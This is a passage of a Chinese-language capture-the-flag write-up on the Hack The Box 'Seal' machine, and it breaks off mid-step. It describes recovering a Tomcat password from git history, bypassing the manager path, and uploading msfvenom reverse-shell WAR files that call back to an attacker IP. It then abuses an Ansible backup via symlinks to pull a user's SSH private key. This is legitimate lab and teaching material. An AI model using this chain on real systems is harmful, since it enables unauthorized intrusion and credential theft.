class="hljs-variable">$scheme</span>;<br>                proxy_pass          http://localhost:8000;<br>                proxy_read_timeout  90;<br>                proxy_redirect      http://localhost:8000 https://0.0.0.0;<br>                <span class="hljs-comment"># First attempt to serve request as file, then</span><br>                <span class="hljs-comment"># as directory, then fall back to displaying a 404.</span><br><span class="hljs-comment">#               try_files $uri $uri/ =404;</span><br>        &#125;<br> <br> <br>	location / &#123;<br>                proxy_set_header        Host <span class="hljs-variable">$host</span>;<br>                proxy_set_header        X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>                proxy_set_header        X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>                proxy_set_header        X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;<br>                proxy_pass          http://localhost:8000;<br>                proxy_read_timeout  90;<br>                proxy_redirect      http://localhost:8000 https://0.0.0.0;<br>	&#125;	<br>	<span class="hljs-comment"># pass PHP scripts to FastCGI server</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment">#location ~ \.php$ &#123;</span><br>	<span class="hljs-comment">#	include snippets/fastcgi-php.conf;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment">#	# With php-fpm (or other unix sockets):</span><br>	<span class="hljs-comment">#	fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;</span><br>	<span class="hljs-comment">#	# With php-cgi (or other tcp sockets):</span><br>	<span class="hljs-comment">#	fastcgi_pass 127.0.0.1:9000;</span><br>	<span class="hljs-comment">#&#125;</span><br> <br>	<span class="hljs-comment"># deny access to .htaccess files, if Apache&#x27;s document root</span><br>	<span class="hljs-comment"># concurs with nginx&#x27;s one</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment">#location ~ /\.ht &#123;</span><br>	<span class="hljs-comment">#	deny all;</span><br>	<span class="hljs-comment">#&#125;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>11、当路径为 &#x2F;admin&#x2F;dashboard 时，会请求服务器本地监听端口 8000。前置存在一个 if 判断，当 ssl_client_verify 校验成功后才能访问。</p>
+<p>12、翻阅历史更新情况， tomcat-users.xml 文件时，发现了密码信息</p>
+<p><code>http://seal.htb:8080/root/seal_market/blob/ac210325afd2f6ae17cce84a8aa42805ce5fd010/tomcat/tomcat-users.xml</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;42MrHBf*z8&#123;Z%&quot;</span> roles=<span class="hljs-string">&quot;manager-gui,admin-gui&quot;</span>/&gt;<br>&lt;/tomcat-users&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、这里开始尝试登录 <code>https://seal.htb/host-manager/html</code> 地址，但是直接访问这个目录是无法访问的，通过查看 <code>https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/tomcat</code> 手册，发现绕过方法</p>
+<p><code>http://www.vulnerable.com/;param=value/manager/html</code></p>
+<p><code>https://seal.htb/;param=value/manager/html</code></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、这里直接使用上传war包，进行获取反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.3 lport=443 -f war -o rce.war<br>Payload size: 12804 bytes<br>Final size of war file: 12804 bytes<br>Saved as: rce.war<br></code></pre></td></tr></table></figure>
+
+<p>15、但是在上传的时候发现了点问题，发现提示403未授权，应该就是缺少session的原因，这里找个session给放上去不就行了？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: JSESSIONID=A55FDD58CCFC458882176EE2AFC20144; <br></code></pre></td></tr></table></figure>
+
+<p>16、然后页面上就正常显示了</p>
+<p><code>https://seal.htb/;param=value/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=6B1EF5DC0DF5C73FB4C7B0C52BF5B7B3</code></p>
+<p><code>果然页面上显示出来了我们上传的包了</code></p>
+<p><code>但是访问的时候，显示为500的报错，可能这里生成的war包还是有些问题</code></p>
+<p><img src="http://sh1yan.top/photo/Seal-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、我们重新生成一下新的木马包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war -o shell.war<br>Payload size: 1090 bytes<br>Final size of war file: 1090 bytes<br>Saved as: shell.war<br></code></pre></td></tr></table></figure>
+
+<p>18、然后我们去访问 <code>https://seal.htb/shell/</code> 地址，这里成功获取到一个反弹的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.3] from (UNKNOWN) [10.10.10.250] 51192<br><span class="hljs-built_in">id</span><br>uid=997(tomcat) gid=997(tomcat) <span class="hljs-built_in">groups</span>=997(tomcat)<br></code></pre></td></tr></table></figure>
+
+<p>19、看了下当前权限，发现还是需要提权，才能获取到第一个flag信息的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>tomcat@seal:/var/lib/tomcat9$ <br>tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x  3 root root 4096 May  5  2021 .<br>drwxr-xr-x 20 root root 4096 May  7  2021 ..<br>drwxr-xr-x  9 luis luis 4096 May  7  2021 luis<br>tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">ls</span> -la/home/luis<br><span class="hljs-built_in">ls</span> -la/home/luis<br><span class="hljs-built_in">ls</span>: invalid option -- <span class="hljs-string">&#x27;/&#x27;</span><br>Try <span class="hljs-string">&#x27;ls --help&#x27;</span> <span class="hljs-keyword">for</span> more information.<br>tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">ls</span> -la /home/luis<br><span class="hljs-built_in">ls</span> -la /home/luis<br>total 51320<br>drwxr-xr-x 9 luis luis     4096 May  7  2021 .<br>drwxr-xr-x 3 root root     4096 May  5  2021 ..<br>drwxrwxr-x 3 luis luis     4096 May  7  2021 .ansible<br>lrwxrwxrwx 1 luis luis        9 May  5  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 luis luis      220 May  5  2021 .bash_logout<br>-rw-r--r-- 1 luis luis     3797 May  5  2021 .bashrc<br>drwxr-xr-x 3 luis luis     4096 May  7  2021 .cache<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .config<br>drwxrwxr-x 6 luis luis     4096 Jan 21 12:46 .gitbucket<br>-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .java<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 luis luis      807 May  5  2021 .profile<br>drwx------ 2 luis luis     4096 May  7  2021 .ssh<br>-r-------- 1 luis luis       33 Jan 21 12:46 user.txt<br>tomcat@seal:/var/lib/tomcat9$ <br></code></pre></td></tr></table></figure>
+
+<p>20、 通过查看目标用户组的文件，发现了一些备份信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9$ find / -group luis 2&gt;/dev/null | grep -v /proc | grep -v /home<br>&lt;up luis 2&gt;/dev/null | grep -v /proc | grep -v /home<br>/opt/backups<br>/opt/backups/archives<br>/opt/backups/archives/backup-2024-01-21-14:30:33.gz<br>/opt/backups/playbook<br>/opt/backups/playbook/run.yml<br>tomcat@seal:/var/lib/tomcat9$ <br></code></pre></td></tr></table></figure>
+
+<p>21、发现luis用户，可以对以上文件进行操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">cat</span> /opt/backups/playbook/run.yml<br><span class="hljs-built_in">cat</span> /opt/backups/playbook/run.yml<br>- hosts: localhost<br>  tasks:<br>  - name: Copy Files<br>    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=<span class="hljs-built_in">yes</span><br>  - name: Server Backups<br>    archive:<br>      path: /opt/backups/files/<br>      dest: <span class="hljs-string">&quot;/opt/backups/archives/backup-&#123;&#123;ansible_date_time.date&#125;&#125;-&#123;&#123;ansible_date_time.time&#125;&#125;.gz&quot;</span><br>  - name: Clean<br>    file:<br>      state: absent<br>      path: /opt/backups/files/<br>tomcat@seal:/var/lib/tomcat9$ <br></code></pre></td></tr></table></figure>
+
+<p><code>“复制文件”获取仪表板的所有文件， files 并使用 synchronize 模块将它们复制到此目录中的文件夹中。请务必注意该 copy_links=yes 指令。</code></p>
+<p><code>“Server Backups”运行存档模块，该模块生成带有时间戳 .gz 的文件。</code></p>
+<p><code>“Clean” 使用文件模块删除 files 目录。</code></p>
+<p><code>为了利用这一点，我需要在 Tomcat Web 目录中寻找可以编写的内容。该 uploads 文件夹的工作原理：</code></p>
+<p>22、那我们可以通过备份的形式，把 luis 用户的根目录进行备份，这样就可以获取到目标的一些信息了，比如.ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">ln</span> -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/<br>&lt;r/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/       <br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">cd</span> uploads/<br><span class="hljs-built_in">cd</span> uploads/<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxrwxrwx 2 root   root   4096 Jan 21 14:35 .<br>drwxr-xr-x 7 root   root   4096 May  7  2021 ..<br>lrwxrwxrwx 1 tomcat tomcat   11 Jan 21 14:35 luis -&gt; /home/luis/<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ <span class="hljs-built_in">cd</span> luis<br><span class="hljs-built_in">cd</span> luis<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>gitbucket.war  user.txt<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">ls</span> -la<br>&lt;9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">ls</span> -la                    <br>total 51320<br>drwxr-xr-x 9 luis luis     4096 May  7  2021 .<br>drwxr-xr-x 3 root root     4096 May  5  2021 ..<br>drwxrwxr-x 3 luis luis     4096 May  7  2021 .ansible<br>lrwxrwxrwx 1 luis luis        9 May  5  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 luis luis      220 May  5  2021 .bash_logout<br>-rw-r--r-- 1 luis luis     3797 May  5  2021 .bashrc<br>drwxr-xr-x 3 luis luis     4096 May  7  2021 .cache<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .config<br>drwxrwxr-x 6 luis luis     4096 Jan 21 12:46 .gitbucket<br>-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .java<br>drwxrwxr-x 3 luis luis     4096 May  5  2021 .<span class="hljs-built_in">local</span><br>-rw-r--r-- 1 luis luis      807 May  5  2021 .profile<br>drwx------ 2 luis luis     4096 May  7  2021 .ssh<br>-r-------- 1 luis luis       33 Jan 21 12:46 user.txt<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">cd</span> .ssh<br>&lt;/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">cd</span> .ssh                    <br>bash: <span class="hljs-built_in">cd</span>: .ssh: Permission denied<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>gitbucket.war  user.txt<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">cd</span> ../<br>&lt;9/webapps/ROOT/admin/dashboard/uploads/luis$ <span class="hljs-built_in">cd</span> ../                    <br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ <br></code></pre></td></tr></table></figure>
+
+<p>23、查看备份的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">ls</span> -l /opt/backups/archives/<br>&lt;/ROOT/admin/dashboard$ <span class="hljs-built_in">ls</span> -l /opt/backups/archives/       <br>total 338676<br>-rw-rw-r-- 1 luis luis 115600641 Jan 21 14:35 backup-2024-01-21-14:35:32.gz<br>-rw-rw-r-- 1 luis luis 115600685 Jan 21 14:36 backup-2024-01-21-14:36:33.gz<br>-rw-rw-r-- 1 luis luis 115600731 Jan 21 14:37 backup-2024-01-21-14:37:32.gz<br>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ <span class="hljs-built_in">cd</span> /opt/backups/archives/<br>&lt;pps/ROOT/admin/dashboard$ <span class="hljs-built_in">cd</span> /opt/backups/archives/       <br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 338684<br>drwxrwxr-x 2 luis luis      4096 Jan 21 14:37 .<br>drwxr-xr-x 4 luis luis      4096 Jan 21 14:37 ..<br>-rw-rw-r-- 1 luis luis 115600641 Jan 21 14:35 backup-2024-01-21-14:35:32.gz<br>-rw-rw-r-- 1 luis luis 115600685 Jan 21 14:36 backup-2024-01-21-14:36:33.gz<br>-rw-rw-r-- 1 luis luis 115600731 Jan 21 14:37 backup-2024-01-21-14:37:32.gz<br>tomcat@seal:/opt/backups/archives$ tar -xvf backup-2024-01-21-14:37:32.gz<br>tar -xvf backup-2024-01-21-14:37:32.gz<br>tar: Cannot connect to backup-2024-01-21-14: resolve failed<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backup-2024-01-21-14:35:32.gz  backup-2024-01-21-14:37:32.gz<br>backup-2024-01-21-14:36:33.gz  backup-2024-01-21-14:38:33.gz<br>tomcat@seal:/opt/backups/archives$ <br></code></pre></td></tr></table></figure>
+
+<p>24、文件还是很多的，这里使用Base64进行文件传输是不合适的，所以还是启动一个python3 的WEB的服务进行下载吧，算了，这里文件还是太大了，我们重新软链接一下吧，直接把 .ssh 的文件目录链接下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">ln</span> -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/<br>&lt;r/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/<br>tomcat@seal:/var/lib/tomcat9$<br></code></pre></td></tr></table></figure>
+
+<p>25、查看信息获取情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">ls</span> -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/<br>&lt;r/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/<br>total 8<br>drwxrwxrwx 2 root   root   4096 Jan 21 14:47 .<br>drwxr-xr-x 7 root   root   4096 May  7  2021 ..<br>lrwxrwxrwx 1 tomcat tomcat   16 Jan 21 14:47 .ssh -&gt; /home/luis/.ssh/<br>tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">cd</span> <br><br>tomcat@seal:/var/lib/tomcat9$ <span class="hljs-built_in">cd</span> /opt/backups/archives/   <br><span class="hljs-built_in">cd</span> /opt/backups/archives/<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span> <br><span class="hljs-built_in">ls</span><br>backup-2024-01-21-14:45:33.gz  backup-2024-01-21-14:47:32.gz<br>backup-2024-01-21-14:46:33.gz<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cp</span> backup-2024-01-21-14:47:32.gz /tmp/backup-2024-01-21-14:47:32.gz<br>&lt;1-21-14:47:32.gz /tmp/backup-2024-01-21-14:47:32.gz<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">ls</span> -la /tmp<br><span class="hljs-built_in">ls</span> -la /tmp<br>total 608<br>drwxrwxrwt  3 root   root     4096 Jan 21 14:48 .<br>drwxr-xr-x 20 root   root     4096 May  7  2021 ..<br>-rw-r-----  1 tomcat tomcat 609575 Jan 21 14:48 backup-2024-01-21-14:47:32.gz<br>drwxr-x---  2 tomcat tomcat   4096 Jan 21 12:46 hsperfdata_tomcat<br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cd</span> tmp<br><span class="hljs-built_in">cd</span> tmp<br>bash: <span class="hljs-built_in">cd</span>: tmp: No such file or directory<br><br>tomcat@seal:/opt/backups/archives$ <br>tomcat@seal:/opt/backups/archives$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>tomcat@seal:/tmp$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 608<br>drwxrwxrwt  3 root   root     4096 Jan 21 14:48 .<br>drwxr-xr-x 20 root   root     4096 May  7  2021 ..<br>-rw-r-----  1 tomcat tomcat 609575 Jan 21 14:48 backup-2024-01-21-14:47:32.gz<br>drwxr-x---  2 tomcat tomcat   4096 Jan 21 12:46 hsperfdata_tomcat<br>tomcat@seal:/tmp$ tar -xvf backup-2024-01-21-14:47:32.gz<br>tar -xvf backup-2024-01-21-14:47:32.gz<br>tar: Cannot connect to backup-2024-01-21-14: resolve failed<br>tomcat@seal:/tmp$ <br>tomcat@seal:/tmp$ tar -xvf backup-2024-01-21-14:47:32.gz --force-local<br>tar -xvf backup-2024-01-21-14:47:32.gz --force-local<br>dashboard/<br>dashboard/scripts/<br>dashboard/images/<br>dashboard/css/<br>dashboard/uploads/<br>dashboard/bootstrap/<br>dashboard/index.html<br>dashboard/scripts/flot/<br>dashboard/scripts/datatables/<br>dashboard/scripts/jquery-ui-1.10.1.custom.min.js<br>dashboard/scripts/common.js<br>dashboard/scripts/jquery-1.9.1.min.js<br>dashboard/scripts/flot/jquery.flot.resize.js<br>dashboard/scripts/flot/jquery.flot.pie.js<br>dashboard/scripts/flot/jquery.flot.js<br>dashboard/scripts/datatables/jquery.dataTables.js<br>dashboard/images/jquery-ui/<br>dashboard/images/icons/<br>dashboard/images/img.jpg<br>dashboard/images/user.png<br>dashboard/images/bg.png<br>dashboard/images/jquery-ui/picker.png<br>dashboard/images/icons/css/<br>dashboard/images/icons/font/<br>dashboard/images/icons/css/font-awesome.css<br>dashboard/images/icons/font/fontawesome-webfont3294.ttf<br>dashboard/images/icons/font/fontawesome-webfontd41d.eot<br>dashboard/images/icons/font/fontawesome-webfont3294.eot<br>dashboard/images/icons/font/fontawesome-webfont3294.woff<br>dashboard/css/theme.css<br>dashboard/uploads/.ssh/<br>dashboard/uploads/.ssh/id_rsa<br>dashboard/uploads/.ssh/id_rsa.pub<br>dashboard/uploads/.ssh/authorized_keys<br>dashboard/bootstrap/css/<br>dashboard/bootstrap/js/<br>dashboard/bootstrap/img/<br>dashboard/bootstrap/css/bootstrap-responsive.min.css<br>dashboard/bootstrap/css/bootstrap.min.css<br>dashboard/bootstrap/js/bootstrap.min.js<br>dashboard/bootstrap/img/glyphicons-halflings.png<br>dashboard/bootstrap/img/glyphicons-halflings-white.png<br>tomcat@seal:/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backup-2024-01-21-14:47:32.gz  dashboard  hsperfdata_tomcat<br>tomcat@seal:/tmp$ <span class="hljs-built_in">cd</span> dashboard<br><span class="hljs-built_in">cd</span> dashboard<br>tomcat@seal:/tmp/dashboard$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bootstrap  css  images  index.html  scripts  uploads<br>tomcat@seal:/tmp/dashboard$ <span class="hljs-built_in">cd</span> uploads<br><span class="hljs-built_in">cd</span> uploads<br>tomcat@seal:/tmp/dashboard/uploads$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>tomcat@seal:/tmp/dashboard/uploads$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-x--- 3 tomcat tomcat 4096 Jan 21 14:49 .<br>drwxr-x--- 7 tomcat tomcat 4096 May  7  2021 ..<br>drwx------ 2 tomcat tomcat 4096 May  7  2021 .ssh<br>tomcat@seal:/tmp/dashboard/uploads$ <span class="hljs-built_in">cd</span> .ssh <br><span class="hljs-built_in">cd</span> .ssh<br>tomcat@seal:/tmp/dashboard/uploads/.ssh$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwx------ 2 tomcat tomcat 4096 May  7  2021 .<br>drwxr-x--- 3 tomcat tomcat 4096 Jan 21 14:49 ..<br>-rw-r----- 1 tomcat tomcat  563 May  7  2021 authorized_keys<br>-rw------- 1 tomcat tomcat 2590 May  7  2021 id_rsa<br>-rw-r----- 1 tomcat tomcat  563 May  7  2021 id_rsa.pub<br>tomcat@seal:/tmp/dashboard/uploads/.ssh$ <br></code></pre></td></tr></table></figure>
+
+<p>26、那接下来本地存储下这个 .ssh 的秘钥吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomcat@seal:/tmp/dashboard/uploads/.ssh$ <span class="hljs-built_in">cat</span> 